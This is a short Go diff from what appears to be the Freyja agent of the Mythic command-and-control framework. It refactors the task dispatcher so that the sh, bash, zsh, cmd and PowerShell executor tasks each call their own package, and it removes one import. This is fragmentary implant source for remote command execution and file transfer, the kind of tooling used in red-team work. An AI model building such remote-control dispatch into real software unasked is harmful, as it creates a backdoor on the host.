@@ -8,7 +8,6 @@ import (
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/download"
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/link_tcp"
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/link_webshell"
-	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/runtimeMainThread"
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/structs"
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/powershell_executor"
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/sh_executor"
@@ -30,15 +29,15 @@ func listenForNewTask() {
 		case "exit":
 			os.Exit(0)
 		case "sh_executor":
-			go shell.Run(task)
+			go sh_executor.Run(task)
 		case "bash_executor":
-			go shell.Run(task)
+			go bash_executor.Run(task)
 		case "zsh_executor":
-			go shell.Run(task)
+			go zsh_executor.Run(task)
 		case "cmd_executor":
-			go shell.Run(task)
+			go cmd_executor.Run(task)
 		case "powershell_executor":
-			go shell.Run(task)
+			go powershell_executor.Run(task)
 		case "download":
 			go download.Run(task)
 		case "upload":
